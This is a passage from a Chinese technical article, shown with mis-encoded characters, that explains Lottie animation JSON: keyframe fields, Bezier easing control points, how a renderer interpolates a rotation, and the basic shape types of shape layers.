      <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>                            <span class="hljs-comment">// æ—¶é—´ç‚¹ï¼šç¬¬0å¸§</span>
      <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span>                           <span class="hljs-comment">// èµ·å§‹å€¼ï¼š0åº¦</span>
    <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">90</span><span class="hljs-punctuation">,</span>                           <span class="hljs-comment">// æ—¶é—´ç‚¹ï¼šç¬¬90å¸§</span>
      <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">360</span><span class="hljs-punctuation">]</span>                         <span class="hljs-comment">// ç»“æŸå€¼ï¼š360åº¦</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">]</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p><strong>æ ¸å¿ƒå·®å¼‚æ€»ç»“ï¼š</strong></p>






























<table><thead><tr><th>ç‰¹å¾</th><th>é™æ€å€¼ (<code>a: 0</code>)</th><th>åŠ¨ç”»å€¼ (<code>a: 1</code>)</th></tr></thead><tbody><tr><td><code>k</code> çš„ç±»å‹</td><td>å•ä¸ªæ•°å€¼æˆ–æ•°ç»„</td><td>å…³é”®å¸§å¯¹è±¡æ•°ç»„</td></tr><tr><td>æ—¶é—´è½´</td><td>æ— æ—¶é—´æ¦‚å¿µï¼Œå§‹ç»ˆä¿æŒå›ºå®šå€¼</td><td>åœ¨æ—¶é—´è½´ä¸Šå®šä¹‰å¤šä¸ªçŠ¶æ€ç‚¹</td></tr><tr><td>ç¼“åŠ¨æ§åˆ¶</td><td>æ— </td><td>é€šè¿‡ <code>i</code> å’Œ <code>o</code> æ§åˆ¶è¿åŠ¨èŠ‚å¥</td></tr><tr><td>é€‚ç”¨åœºæ™¯</td><td>é™æ€å±æ€§ï¼ˆå¦‚å›ºå®šä½ç½®ã€å›ºå®šè§’åº¦ï¼‰</td><td>éœ€è¦éšæ—¶é—´å˜åŒ–çš„å±æ€§ï¼ˆç§»åŠ¨ã€æ—‹è½¬ã€ç¼©æ”¾ç­‰ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-15"><strong>å…³é”®å¸§æ•°ç»„ç»“æ„è§£æ</strong></h3>
<p>å½“å±æ€§è®¾ç½®ä¸ºåŠ¨ç”»å€¼ï¼ˆ<code>a: 1</code>ï¼‰æ—¶ï¼Œ<code>k</code>Â å­—æ®µä¸å†æ˜¯ä¸€ä¸ªç®€å•å€¼ï¼Œè€Œæ˜¯ä¸€ä¸ª<strong>å…³é”®å¸§å¯¹è±¡æ•°ç»„</strong>ã€‚æ¯ä¸ªå…³é”®å¸§å¯¹è±¡å®šä¹‰äº†åŠ¨ç”»åœ¨ç‰¹å®šæ—¶é—´ç‚¹çš„çŠ¶æ€ã€‚</p>
<h4 data-id="heading-16"><strong>æ ¸å¿ƒå­—æ®µè¯´æ˜</strong></h4>















































<table><thead><tr><th>å­—æ®µ</th><th>ç±»å‹</th><th>å¿…é€‰</th><th>æè¿°</th></tr></thead><tbody><tr><td><strong><code>t</code></strong></td><td><code>number</code></td><td>æ˜¯</td><td><strong>æ—¶é—´ç‚¹ï¼ˆTimeï¼‰</strong>ï¼šè¯¥å…³é”®å¸§åœ¨æ—¶é—´è½´ä¸Šçš„ä½ç½®ï¼Œå•ä½ä¸ºå¸§ã€‚</td></tr><tr><td><strong><code>s</code></strong></td><td><code>array</code></td><td>æ˜¯</td><td><strong>èµ·å§‹å€¼ï¼ˆStart Valueï¼‰</strong>ï¼šè¯¥å…³é”®å¸§çš„å±æ€§å€¼ã€‚å¯¹äºæ—‹è½¬æ˜¯ <code>[è§’åº¦]</code>ï¼Œä½ç½®æ˜¯ <code>[x, y, z]</code>ã€‚</td></tr><tr><td><strong><code>e</code></strong></td><td><code>array</code></td><td>å¦</td><td><strong>ç»“æŸå€¼ï¼ˆEnd Valueï¼‰</strong>ï¼šä»å½“å‰å…³é”®å¸§åˆ°ä¸‹ä¸€å…³é”®å¸§çš„ç›®æ ‡å€¼ã€‚<strong>é€šå¸¸çœç•¥</strong>ï¼Œæ¸²æŸ“å™¨ä¼šè‡ªåŠ¨ä½¿ç”¨ä¸‹ä¸€å…³é”®å¸§çš„ <code>s</code> å€¼ã€‚</td></tr><tr><td><strong><code>i</code></strong></td><td><code>object</code></td><td>å¦</td><td><strong>å…¥ç¼“åŠ¨ï¼ˆIn Tangentï¼‰</strong>ï¼šå®šä¹‰<strong>è¿›å…¥</strong>å½“å‰å…³é”®å¸§æ—¶çš„é€Ÿåº¦å˜åŒ–æ›²çº¿ï¼ˆè´å¡å°”æ§åˆ¶ç‚¹ï¼‰ã€‚</td></tr><tr><td><strong><code>o</code></strong></td><td><code>object</code></td><td>å¦</td><td><strong>å‡ºç¼“åŠ¨ï¼ˆOut Tangentï¼‰</strong>ï¼šå®šä¹‰<strong>ç¦»å¼€</strong>å½“å‰å…³é”®å¸§æ—¶çš„é€Ÿåº¦å˜åŒ–æ›²çº¿ï¼ˆè´å¡å°”æ§åˆ¶ç‚¹ï¼‰ã€‚</td></tr><tr><td><strong><code>h</code></strong></td><td><code>number</code></td><td>å¦</td><td><strong>ä¿æŒå¸§ï¼ˆHoldï¼‰</strong>ï¼šå€¼ä¸º <code>1</code> æ—¶ï¼Œè¡¨ç¤ºè¯¥å…³é”®å¸§åˆ°ä¸‹ä¸€å…³é”®å¸§ä¹‹é—´<strong>ä¸æ’å€¼</strong>ï¼Œä¿æŒå½“å‰å€¼ï¼ˆé˜¶è·ƒåŠ¨ç”»ï¼‰ã€‚</td></tr></tbody></table>
<blockquote>
<p><strong>è¯´æ˜</strong>ï¼š</p>
<ol>
<li><strong><code>s</code> çš„æ•°æ®ç±»å‹</strong>ï¼šè™½ç„¶å®˜æ–¹ schema ä¸­å®šä¹‰ä¸º <code>number</code>ï¼Œä½†åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œ<code>s</code> é€šå¸¸æ˜¯<strong>æ•°ç»„</strong>ï¼ˆå¦‚ <code>[0]</code> è¡¨ç¤ºæ—‹è½¬ 0 åº¦ï¼Œ<code>[100, 200, 0]</code> è¡¨ç¤ºä½ç½®ï¼‰ã€‚è¿™æ˜¯ä¸ºäº†ç»Ÿä¸€å¤„ç†å•ç»´å’Œå¤šç»´å±æ€§ã€‚</li>
<li><strong><code>e</code> å­—æ®µçš„å®é™…ä½¿ç”¨</strong>ï¼šåœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œ<code>e</code> å­—æ®µä¼šè¢«çœç•¥ï¼Œæ¸²æŸ“å™¨ä¼šè‡ªåŠ¨ä»ä¸‹ä¸€ä¸ªå…³é”®å¸§çš„ <code>s</code> å€¼æ¨æ–­ç›®æ ‡å€¼ã€‚åªæœ‰åœ¨éœ€è¦æ˜¾å¼æ§åˆ¶æ’å€¼ç›®æ ‡æ—¶æ‰ä¼šä½¿ç”¨ã€‚</li>
<li><strong>æœ€åä¸€å¸§</strong>ï¼šæœ€åä¸€ä¸ªå…³é”®å¸§é€šå¸¸åªæœ‰ <code>t</code> å’Œ <code>s</code>ï¼Œä¸éœ€è¦ <code>i</code>ã€<code>o</code>ã€<code>e</code>ï¼ˆå› ä¸ºæ²¡æœ‰ä¸‹ä¸€ä¸ªå…³é”®å¸§ï¼‰ã€‚</li>
</ol>
</blockquote>
<h4 data-id="heading-17"><strong>ç¼“åŠ¨æ§åˆ¶ç‚¹çš„ç»“æ„</strong></h4>
<p><code>i</code> å’Œ <code>o</code> å¯¹è±¡å®šä¹‰äº†è´å¡å°”æ›²çº¿çš„æ§åˆ¶ç‚¹ï¼Œç”¨äºæ§åˆ¶åŠ¨ç”»çš„åŠ é€Ÿåº¦ï¼š</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"i"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.667</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// å…¥ç¼“åŠ¨çš„ X è½´æ§åˆ¶ç‚¹ï¼ˆæ—¶é—´ç»´åº¦ï¼ŒèŒƒå›´ 0-1ï¼‰</span>
    <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span>       <span class="hljs-comment">// å…¥ç¼“åŠ¨çš„ Y è½´æ§åˆ¶ç‚¹ï¼ˆæ•°å€¼ç»´åº¦ï¼Œé€šå¸¸ 0-1ï¼Œä½†å¯è¶…å‡ºï¼‰</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.333</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>  <span class="hljs-comment">// å‡ºç¼“åŠ¨çš„ X è½´æ§åˆ¶ç‚¹</span>
    <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span>       <span class="hljs-comment">// å‡ºç¼“åŠ¨çš„ Y è½´æ§åˆ¶ç‚¹</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li><strong><code>x</code> æ•°ç»„</strong>ï¼šæ§åˆ¶<strong>æ—¶é—´è¿›åº¦</strong>çš„å˜åŒ–ç‡ï¼ˆæ°´å¹³æ–¹å‘ï¼‰</li>
<li><strong><code>y</code> æ•°ç»„</strong>ï¼šæ§åˆ¶<strong>æ•°å€¼å˜åŒ–</strong>çš„é€Ÿç‡ï¼ˆå‚ç›´æ–¹å‘ï¼‰</li>
<li><strong>æ•°ç»„é•¿åº¦</strong>ï¼šå¯¹äºå•ç»´å±æ€§ï¼ˆå¦‚æ—‹è½¬ <code>r</code>ï¼‰ï¼Œæ•°ç»„é•¿åº¦ä¸º 1ï¼›å¯¹äºå¤šç»´å±æ€§ï¼ˆå¦‚ä½ç½® <code>p</code>ï¼‰ï¼Œæ•°ç»„é•¿åº¦å¯¹åº”ç»´åº¦æ•°ï¼ˆå¦‚ <code>[0.5, 0.3]</code> è¡¨ç¤º Xã€Y ä¸¤ä¸ªç»´åº¦çš„ç‹¬ç«‹æ§åˆ¶ï¼‰</li>
</ul>
<blockquote>
<p><strong>å‰ç«¯çŸ¥è¯†å…³è”</strong>ï¼š<code>i</code>Â ä¸Â <code>o</code>Â å®šä¹‰çš„è´å¡å°”æ›²çº¿ï¼Œå…¶ä½œç”¨ä¸ CSS ä¸­çš„Â <code>transition-timing-function</code>Â æˆ–Â <code>animation-timing-function</code>Â å®Œå…¨ä¸€è‡´ï¼Œç”¨äºåˆ›é€ éåŒ€é€Ÿçš„åŠ¨ç”»æ•ˆæœã€‚åŒºåˆ«åœ¨äºï¼ŒCSS ä½¿ç”¨ä¸€ä¸ªäºŒç»´çš„Â <code>cubic-bezier(x1, y1, x2, y2)</code>ï¼Œè€Œ Lottie çš„Â <code>i</code>Â å’ŒÂ <code>o</code>Â å…è®¸ä¸ºæ¯ä¸ªå±æ€§ç»´åº¦å•ç‹¬å®šä¹‰æ§åˆ¶ç‚¹ï¼Œæ§åˆ¶æ›´ä¸ºç²¾ç»†ã€‚</p>
<p><strong>å·¥å…·æ¨è</strong>ï¼šå¦‚æœæ‚¨éœ€è¦ç›´è§‚åœ°åˆ›å»ºæˆ–ç†è§£è´å¡å°”æ›²çº¿ï¼Œå¼ºçƒˆæ¨èä½¿ç”¨åœ¨çº¿å·¥å…·Â <strong><a href="https://link.juejin.cn?target=https%3A%2F%2Fcubic-bezier.com%2F" target="_blank" title="https://cubic-bezier.com/" ref="nofollow noopener noreferrer">cubic-bezier.com</a></strong>ã€‚æ‚¨å¯ä»¥åœ¨é‚£é‡Œè°ƒæ•´æ›²çº¿å¹¶è·å–å¯¹åº”çš„Â <code>cubic-bezier()</code>Â å€¼ï¼Œå…¶åŸç†ä¸ Lottie çš„Â <code>i</code>/<code>o</code>Â æ§åˆ¶ç‚¹ç›¸é€šï¼Œæ˜¯ç†è§£å’Œè°ƒè¯•åŠ¨ç”»ç¼“åŠ¨çš„ç»ä½³åŠ©æ‰‹ã€‚</p>
</blockquote>
<h3 data-id="heading-18"><strong>å…³é”®å¸§çš„å·¥ä½œæµç¨‹</strong></h3>
<p>ä»¥ demo ä¸­çš„æ—‹è½¬åŠ¨ç”»ä¸ºä¾‹ï¼Œè®©æˆ‘ä»¬é€æ­¥æ‹†è§£æ¸²æŸ“å™¨å¦‚ä½•å¤„ç†å…³é”®å¸§ï¼š</p>
<h4 data-id="heading-19"><strong>ç¬¬ 1 æ­¥ï¼šè§£æå…³é”®å¸§æ•°ç»„</strong></h4>
<pre><code class="hljs language-json" lang="json"><span class="hljs-attr">"k"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">0</span><span class="hljs-punctuation">,</span>        <span class="hljs-comment">// ç¬¬0å¸§</span>
    <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span>      <span class="hljs-comment">// æ—‹è½¬è§’åº¦ 0Â°</span>
    <span class="hljs-attr">"i"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.667</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">1</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"o"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"x"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0.333</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span> <span class="hljs-attr">"y"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">0</span><span class="hljs-punctuation">]</span> <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"t"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">90</span><span class="hljs-punctuation">,</span>       <span class="hljs-comment">// ç¬¬90å¸§</span>
    <span class="hljs-attr">"s"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-number">360</span><span class="hljs-punctuation">]</span>     <span class="hljs-comment">// æ—‹è½¬è§’åº¦ 360Â°</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">]</span>
</code></pre>
<p>æ¸²æŸ“å™¨è¯†åˆ«å‡ºï¼š</p>
<ul>
<li>åŠ¨ç”»ä»ç¬¬ 0 å¸§å¼€å§‹ï¼Œåˆ°ç¬¬ 90 å¸§ç»“æŸ</li>
<li>èµ·å§‹è§’åº¦ 0Â°ï¼Œç»“æŸè§’åº¦ 360Â°</li>
<li>éœ€è¦åœ¨è¿™ 90 å¸§ä¹‹é—´è¿›è¡Œæ’å€¼è®¡ç®—</li>
</ul>
<h4 data-id="heading-20"><strong>ç¬¬ 2 æ­¥ï¼šæ’å€¼è®¡ç®—ï¼ˆä»¥ç¬¬ 45 å¸§ä¸ºä¾‹ï¼‰</strong></h4>
<p>å½“æ’­æ”¾åˆ°ç¬¬ 45 å¸§æ—¶ï¼Œæ¸²æŸ“å™¨éœ€è¦è®¡ç®—æ­¤æ—¶çš„æ—‹è½¬è§’åº¦ï¼š</p>
<ol>
<li><strong>è®¡ç®—æ—¶é—´è¿›åº¦</strong>ï¼š<code>progress = (45 - 0) / (90 - 0) = 0.5</code>ï¼ˆå·²å®Œæˆ 50%ï¼‰</li>
<li><strong>åº”ç”¨ç¼“åŠ¨å‡½æ•°</strong>ï¼šæ ¹æ® <code>i</code> å’Œ <code>o</code> çš„è´å¡å°”æ§åˆ¶ç‚¹ï¼Œå°†çº¿æ€§è¿›åº¦ <code>0.5</code> è½¬æ¢ä¸ºç¼“åŠ¨åçš„è¿›åº¦ï¼ˆå‡è®¾ä¸º <code>0.55</code>ï¼‰</li>
<li><strong>è®¡ç®—å±æ€§å€¼</strong>ï¼š<code>angle = 0 + (360 - 0) Ã— 0.55 = 198Â°</code></li>
</ol>
<h4 data-id="heading-21"><strong>ç¬¬ 3 æ­¥ï¼šæ¸²æŸ“å½“å‰å¸§</strong></h4>
<p>æ¸²æŸ“å™¨å°†è®¡ç®—å‡ºçš„ 198Â° åº”ç”¨åˆ°å›¾å±‚çš„æ—‹è½¬å±æ€§ï¼Œå®Œæˆè¯¥å¸§çš„ç»˜åˆ¶ã€‚</p>
<h4 data-id="heading-22"><strong>å…³é”®å¸§çš„è¿ç»­æ€§</strong></h4>
<p>åœ¨å¤šä¸ªå…³é”®å¸§çš„åœºæ™¯ä¸­ï¼Œæ¸²æŸ“å™¨ä¼šï¼š</p>
<ul>
<li><strong>å®šä½å½“å‰åŒºé—´</strong>ï¼šæ‰¾åˆ°å½“å‰æ—¶é—´ç‚¹æ‰€åœ¨çš„å…³é”®å¸§åŒºé—´ï¼ˆå¦‚ç¬¬ 30 å¸§ä½äºç¬¬ 0 å¸§å’Œç¬¬ 90 å¸§ä¹‹é—´ï¼‰</li>
<li><strong>ä½¿ç”¨å¯¹åº”ç¼“åŠ¨</strong>ï¼šåº”ç”¨è¯¥åŒºé—´èµ·å§‹å…³é”®å¸§çš„ <code>o</code>ï¼ˆå‡ºç¼“åŠ¨ï¼‰å’Œç»“æŸå…³é”®å¸§çš„ <code>i</code>ï¼ˆå…¥ç¼“åŠ¨ï¼‰</li>
<li><strong>ç‹¬ç«‹æ’å€¼</strong>ï¼šå¯¹äºå¤šç»´å±æ€§ï¼ˆå¦‚ä½ç½® <code>[x, y, z]</code>ï¼‰ï¼Œæ¯ä¸ªç»´åº¦ç‹¬ç«‹è¿›è¡Œæ’å€¼è®¡ç®—</li>
</ul>
<h3 data-id="heading-23"><strong>æœ¬ç« å°ç»“</strong></h3>
<p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»æŒæ¡äº† Lottie åŠ¨ç”»ç³»ç»Ÿçš„â€œåŠ¨åŠ›æºâ€ï¼š<strong>å…³é”®å¸§ã€æ’å€¼ä¸ç¼“åŠ¨</strong>ã€‚</p>
<ul>
<li><strong>é™æ€ä¸åŠ¨ç”»çš„å¼€å…³</strong>ï¼šé€šè¿‡Â <code>a</code>Â å­—æ®µ (<code>0</code>Â æˆ–Â <code>1</code>) åˆ‡æ¢å±æ€§çš„é™æ€ä¸åŠ¨æ€æ¨¡å¼ï¼Œæ˜¯ç†è§£ Lottie åŠ¨ç”»é€»è¾‘çš„ç¬¬ä¸€è¯¾ã€‚</li>
<li><strong>å…³é”®å¸§å®šä¹‰çŠ¶æ€</strong>ï¼š<code>k</code>Â æ•°ç»„ä¸­çš„æ¯ä¸ªå…³é”®å¸§å¯¹è±¡ï¼Œé€šè¿‡Â <code>t</code>Â (æ—¶é—´) å’ŒÂ <code>s</code>Â (æ•°å€¼) åœ¨æ—¶é—´è½´ä¸Šé”šå®šäº†åŠ¨ç”»çš„å„ä¸ªâ€œå…³é”®æ—¶åˆ»â€ã€‚</li>
<li><strong>ç¼“åŠ¨èµ‹äºˆçµé­‚</strong>ï¼š<code>i</code>Â (å…¥ç¼“åŠ¨) ä¸Â <code>o</code>Â (å‡ºç¼“åŠ¨) æ‰€å®šä¹‰çš„è´å¡å°”æ›²çº¿ï¼Œæ§åˆ¶äº†æ•°å€¼å˜åŒ–çš„é€Ÿç‡ä¸èŠ‚å¥ï¼Œæ˜¯è®©åŠ¨ç”»æ‘†è„±æœºæ¢°æ„Ÿã€è·å¾—ç”Ÿå‘½åŠ›çš„å…³é”®ã€‚</li>
<li><strong>æ¸²æŸ“å™¨æ‰§è¡Œæ’å€¼</strong>ï¼šåœ¨å…³é”®å¸§ä¹‹é—´ï¼ŒLottie æ¸²æŸ“å™¨ä¼šä¾æ®ç¼“åŠ¨æ›²çº¿ï¼Œä¸ºæ¯ä¸€å¸§<strong>å®æ—¶è®¡ç®—</strong>å‡ºç²¾ç¡®çš„å±æ€§å€¼ï¼Œä»è€Œåˆ›é€ å‡ºå¹³æ»‘çš„åŠ¨ç”»æ•ˆæœã€‚</li>
</ul>
<p>æ‚¨å·²ç»äº†è§£äº†ä»å®šä¹‰åˆ°æ¸²æŸ“çš„å®Œæ•´é“¾æ¡ã€‚å…³äº<strong>è´å¡å°”æ›²çº¿çš„æ•°å­¦åŸç†</strong>ã€<strong>å¤šç»´å±æ€§çš„ç‹¬ç«‹æ’å€¼ç­–ç•¥</strong>ä»¥åŠæ›´å¤æ‚çš„<strong>è¡¨è¾¾å¼åŠ¨ç”»</strong>ï¼Œéƒ½å±äºæ›´æ·±å…¥çš„è¯é¢˜ã€‚æŒæ¡äº†æœ¬ç« çš„æ ¸å¿ƒæ•°æ®æ¨¡å‹ï¼Œæ‚¨å·²ç»å…·å¤‡äº†è‡ªè¡Œè§£æç»å¤§å¤šæ•° Lottie åŠ¨ç”»ã€å¹¶ç†è§£å…¶è¿åŠ¨é€»è¾‘çš„èƒ½åŠ›ã€‚</p>
<hr/>
<h2 data-id="heading-24"><strong>äº”ã€å½¢çŠ¶ç³»ç»Ÿ - çŸ¢é‡å›¾å½¢</strong></h2>
<p>åœ¨ Lottie çš„å…­ç§åŸºç¡€å›¾å±‚ä¸­ï¼Œ<strong>å½¢çŠ¶å›¾å±‚ï¼ˆShape Layerï¼Œ<code>ty: 4</code>ï¼‰</strong> Â å æ®ç€ç‹¬ç‰¹è€Œæ ¸å¿ƒçš„åœ°ä½ã€‚å…¶ä»–å›¾å±‚ç±»å‹â€”â€”å¦‚ç©ºå¯¹è±¡å›¾å±‚ï¼ˆç”¨äºæ§åˆ¶ï¼‰ã€é¢„åˆæˆå›¾å±‚ï¼ˆç”¨äºåµŒå¥—ï¼‰ã€å›¾åƒå›¾å±‚ï¼ˆé™æ€ä½å›¾ï¼‰å’Œæ–‡æœ¬å›¾å±‚ï¼ˆå­—å½¢åŠ¨ç”»ï¼‰â€”â€”è™½ç„¶åœ¨ç‰¹å®šåœºæ™¯ä¸‹ä¸å¯æˆ–ç¼ºï¼Œä½†å®ƒä»¬åœ¨æ•°æ®ç»“æ„å’ŒåŠ¨ç”»èƒ½åŠ›ä¸Šç›¸å¯¹ç®€å•ã€‚</p>
<p>å½¢çŠ¶å›¾å±‚ï¼ˆ<code>ty: 4</code>ï¼‰æ˜¯ Lottie å®ç°å¤æ‚çŸ¢é‡åŠ¨ç”»çš„æ ¸å¿ƒã€‚ä¸å…¶ä»–å›¾å±‚ç±»å‹ç›¸æ¯”ï¼Œå®ƒæ‹¥æœ‰æœ€ä¸°å¯Œçš„ä¸“æœ‰å±æ€§å’Œæœ€å¼ºçš„åŠ¨ç”»è¡¨ç°åŠ›ã€‚</p>
<h3 data-id="heading-25"><strong>å½¢çŠ¶å›¾å±‚çš„ç»“æ„ï¼š<code>ty: 4</code>Â ä¸Â <code>shapes</code>Â æ•°ç»„</strong></h3>
<p>å½“ä¸€ä¸ªå›¾å±‚çš„Â <code>ty</code>Â å€¼ä¸ºÂ <code>4</code>Â æ—¶ï¼Œå®ƒå°±æ˜¯ä¸€ä¸ªå½¢çŠ¶å›¾å±‚ã€‚å…¶æ ¸å¿ƒæ•°æ®å®¹å™¨æ˜¯Â <strong><code>shapes</code></strong>Â æ•°ç»„ï¼ˆåœ¨æ—©æœŸçš„ Lottie ç‰ˆæœ¬ä¸­å¯èƒ½æ ‡è®°ä¸ºÂ <code>it</code>ï¼‰ã€‚è¯¥æ•°ç»„æ˜¯ä¸€ä¸ª<strong>æœ‰åºçš„åˆ—è¡¨</strong>ï¼Œå®šä¹‰äº†æ„æˆæœ€ç»ˆçŸ¢é‡å›¾å½¢çš„æ‰€æœ‰åŸºç¡€å…ƒç´ ï¼Œä¾‹å¦‚è·¯å¾„ã€æè¾¹ã€å¡«å……ç­‰ã€‚</p>
<ul>
<li><strong>æœ‰åºæ¸²æŸ“ä¸å åŠ </strong>ï¼š<code>shapes</code>Â æ•°ç»„ä¸­çš„å…ƒç´ ä¸¥æ ¼éµå¾ª<strong>æ•°ç»„ç´¢å¼•é¡ºåºï¼ˆä»Â <code>0</code>Â åˆ°Â <code>n-1</code>ï¼‰è¿›è¡Œæ¸²æŸ“</strong>ã€‚åœ¨è§†è§‰ä¸Šï¼Œè¿™æ„å‘³ç€<strong>ç´¢å¼•å€¼æ›´å¤§çš„å…ƒç´ ï¼ˆåæ¸²æŸ“ï¼‰ä¼šå åŠ åœ¨ç´¢å¼•å€¼æ›´å°çš„å…ƒç´ ï¼ˆå…ˆæ¸²æŸ“ï¼‰ä¹‹ä¸Š</strong>ã€‚ä¾‹å¦‚ï¼Œ<code>shapes[2]</code>Â ä¼šè¦†ç›–åœ¨Â <code>shapes[0]</code>Â å’ŒÂ <code>shapes[1]</code>Â ä¹‹ä¸Šã€‚è¿™ä¸€è§„åˆ™æ˜¯ç»„ç»‡å¤æ‚å›¾å½¢å±‚çº§çš„åŸºç¡€ã€‚</li>
<li><strong>å…ƒç´ ç±»å‹</strong>ï¼šæ¯ä¸ªå…ƒç´ éƒ½æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å¯¹è±¡ï¼Œå¹¶é€šè¿‡Â <code>ty</code>Â å­—æ®µæ¥å£°æ˜è‡ªå·±çš„ç±»å‹ï¼ˆå¦‚Â <code>gr</code>Â è¡¨ç¤ºç»„ï¼Œ<code>sh</code>Â è¡¨ç¤ºè·¯å¾„ç­‰ï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-26"><strong>å››ç§åŸºç¡€å½¢çŠ¶ç±»å‹é€Ÿè§ˆ</strong></h3>
<p><code>shapes</code>Â æ•°ç»„ä¸­å¯ä»¥åŒ…å«å¤šç§å›¾å½¢å…ƒç´ ï¼Œå…¶ä¸­åŸºç¡€å½¢çŠ¶ä¸»è¦æœ‰ä»¥ä¸‹å››ç§ï¼š</p>



































<table><thead><tr><th>ç±»å‹æ ‡è¯† (<code>ty</code>)</th><th>åç§°</th><th>æè¿°</th><th>æ ¸å¿ƒåŠ¨ç”»å±æ€§</th></tr></thead><tbody><tr><td><strong><code>rc</code></strong></td><td><strong>çŸ©å½¢</strong></td><td>å®šä¹‰çŸ©å½¢æˆ–åœ†è§’çŸ©å½¢ã€‚</td><td><code>p</code>Â (ä½ç½®),Â <code>s</code>Â (å°ºå¯¸),Â <code>r</code>Â (åœ†è§’åŠå¾„)</td></tr><tr><td><strong><code>el</code></strong></td><td><strong>æ¤­åœ†</strong></td><td>å®šä¹‰åœ†å½¢æˆ–æ¤­åœ†å½¢ã€‚</td><td><code>p</code>Â (ä¸­å¿ƒç‚¹),Â <code>s</code>Â (åŠå¾„/å°ºå¯¸)</td></tr><tr><td><strong><code>sr</code></strong></td><td><strong>æ˜Ÿå½¢/å¤šè¾¹å½¢</strong></td><td>å®šä¹‰æ˜Ÿå½¢æˆ–å¤šè¾¹å½¢ï¼Œå¯æ§åˆ¶è§’æ•°ã€å†…å¤–å¾„ç­‰ã€‚</td><td><code>p</code>Â (ä¸­å¿ƒç‚¹),Â <code>ir</code>/<code>or</code>Â (å†…/å¤–åŠå¾„),Â <code>pt</code>Â (è§’æ•°)</td></tr><tr><td><strong><code>sh</code></strong></td><td><strong>è‡ªç”±è·¯å¾„</strong></td><td>ç”±è´å¡å°”æ›²çº¿æ„æˆçš„ä»»æ„å½¢çŠ¶è·¯å¾„ï¼Œæ˜¯çŸ¢é‡å›¾å½¢çš„åŸºç¡€ã€‚</td><td><code>ks</code>Â (è·¯å¾„æ•°æ®ï¼ŒåŒ…å«é¡¶ç‚¹ä¸è´å¡å°”æ§åˆ¶ç‚¹)</td></tr></tbody></table>
<blockquote>
<p><strong>è¯´æ˜</strong>ï¼š<code>rc</code>,Â <code>el</code>,Â <code>sr</code>Â æœ¬è´¨ä¸Šæ˜¯å‚æ•°åŒ–å½¢çŠ¶ï¼Œå®ƒä»¬ä¼šåœ¨å¯¼å‡ºæ—¶è¢«è½¬æ¢ä¸ºæœ€ç»ˆçš„Â <code>sh</code>ï¼ˆè·¯å¾„ï¼‰æ•°æ®ã€‚ä½†åœ¨ JSON ä¸­ï¼Œå®ƒä»¬ä½œä¸ºé€»è¾‘å…ƒç´ å­˜åœ¨ï¼Œä¾¿äºç†è§£å’Œç¼–è¾‘ã€‚</p>
</blockquote>
<h3 data-id="heading-27"><strong>è‡ªç”±è·¯å¾„çš„æ ¸å¿ƒï¼šé¡¶ç‚¹ä¸è´å¡å°”æ§åˆ¶ç‚¹</strong></h3>
